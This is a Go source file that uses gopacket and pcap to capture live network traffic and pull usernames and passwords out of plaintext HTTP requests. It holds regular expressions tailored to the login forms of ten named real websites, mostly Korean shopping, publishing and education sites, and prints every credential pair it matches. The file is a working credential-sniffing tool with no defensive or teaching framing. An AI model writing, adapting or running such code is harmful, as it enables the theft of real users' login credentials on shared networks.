package main

import (
	"bytes"
	"fmt"
	"log"
	"regexp"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	reMap = map[string]*regexp.Regexp{
		"http://www.dailysecu.com/":   regexp.MustCompile(`&login_userid=(.+)&login_userpw=(.+)`),
		"http://www.hanbit.co.kr/":    regexp.MustCompile(`&m_id=(.+)&m_passwd=(.+)`),
		"http://www.icqa.or.kr/":      regexp.MustCompile(`&txtID=(.+)&txtPass=(.+)`),
		"http://www.giordano.co.kr/":  regexp.MustCompile(`Data%5Bid%5D=(.+)&Data%5Bpw%5D=(.+)`),
		"http://www.nike.co.kr/":      regexp.MustCompile(`&loginId=(.+)&password=(.+)`),
		"http://www.junggo.com/":      regexp.MustCompile(`&mb_id=(.+)&mb_password=(.+)`),
		"http://m.bunjang.co.kr/":     regexp.MustCompile(`userid=(.+)&userpw=(.+)`),
		"http://www.coocha.co.kr/":    regexp.MustCompile(`mid=(.+)&mpwd=(.+)`),
		"http://www.daisomall.co.kr/": regexp.MustCompile(`&id=(.+)&pw=(.+)`),
		"http://www.ebsi.co.kr/":      regexp.MustCompile(`username=(.+)&j_password=(.+)`),
	}
)

func parse(device pcap.Interface) {
	handle, err := pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		tcpLayer := packet.Layer(layers.LayerTypeTCP)
		if tcpLayer != nil {
			tcpPacket := tcpLayer.(*layers.TCP)
			http := tcpPacket.Payload

			if len(http) > 5 && (bytes.Equal(http[:4], []byte("GET ")) || bytes.Equal(http[:5], []byte("POST "))) {
				for url, re := range reMap {
					parsed := re.FindSubmatch(http)
					if len(parsed) != 3 {
						continue
					}
					fmt.Println(url, ":", string(parsed[1]), string(parsed[2]))
				}
			}
		}
	}
}
